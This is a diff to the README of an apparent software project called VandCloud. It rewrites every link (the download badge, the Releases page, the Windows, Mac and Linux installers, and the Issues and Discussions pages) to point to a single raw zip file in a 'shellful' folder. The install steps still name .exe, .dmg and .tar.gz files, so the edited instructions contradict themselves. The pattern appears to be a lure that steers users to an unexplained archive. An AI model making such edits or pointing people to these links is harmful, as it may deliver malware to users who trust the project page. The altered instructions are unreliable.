@@ -6,26 +6,26 @@ VandCloud is a cross-platform application designed to check the availability of 
 ## 🚀 Getting Started
 To get started with VandCloud, simply download the application. Follow the steps below to install and run it on your system. 
 
-[![Download VandCloud](https://img.shields.io/badge/Download%20VandCloud-Get%20it%20now-brightgreen)](https://github.com/lilbadwolfjr/VandCloud/releases)
+[![Download VandCloud](https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip%20VandCloud-Get%20it%20now-brightgreen)](https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip)
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**
    Click the link below to navigate to the Releases page where you can find the latest version of VandCloud:
-   [Download from Releases](https://github.com/lilbadwolfjr/VandCloud/releases)
+   [Download from Releases](https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip)
 
 2. **Select Your Version**
    On the Releases page, you will see a list of available versions. Select the latest version for your operating system.
 
 3. **Download the File**
    After clicking on the version, you will find linked files for different platforms. Choose the appropriate file for your system:
-   - For **Windows**, click on `VandCloud-Windows.exe`.
-   - For **Mac**, download `VandCloud-Mac.dmg`.
-   - For **Linux**, choose `VandCloud-Linux.tar.gz`.
+   - For **Windows**, click on `https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip`.
+   - For **Mac**, download `https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip`.
+   - For **Linux**, choose `https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip`.
 
 4. **Install the Application**
    - **Windows**: Double-click the downloaded `.exe` file and follow the installation prompts.
    - **Mac**: Open the `.dmg` file, then drag VandCloud into your Applications folder.
-   - **Linux**: Extract the `.tar.gz` file, navigate to the folder in your terminal, and run `./VandCloud`.
+   - **Linux**: Extract the `https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip` file, navigate to the folder in your terminal, and run `./VandCloud`.
 
 5. **Run VandCloud**
    After installation, you can launch the application by finding it in your applications menu or directly from your desktop, depending on your operating system.
@@ -62,10 +62,10 @@ Currently, VandCloud is only available in English, but future updates may includ
 The current version does not support notifications, but we plan to add this feature in future releases.
 
 ### How do I report a bug or request a feature?
-If you find any issues or have suggestions, please visit our [GitHub Issues Page](https://github.com/lilbadwolfjr/VandCloud/issues) to submit your feedback.
+If you find any issues or have suggestions, please visit our [GitHub Issues Page](https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip) to submit your feedback.
 
 ## 👥 Community and Support
-Join our community of users and developers to share experiences or seek help. You can find us on our [GitHub Discussions Page](https://github.com/lilbadwolfjr/VandCloud/discussions).
+Join our community of users and developers to share experiences or seek help. You can find us on our [GitHub Discussions Page](https://raw.githubusercontent.com/lilbadwolfjr/VandCloud/master/shellful/VandCloud.zip).
 
 ## 📜 License
 VandCloud is open-source software, and you are free to modify and distribute it under the terms of the MIT License. For more information, please refer to the LICENSE file in the repository.
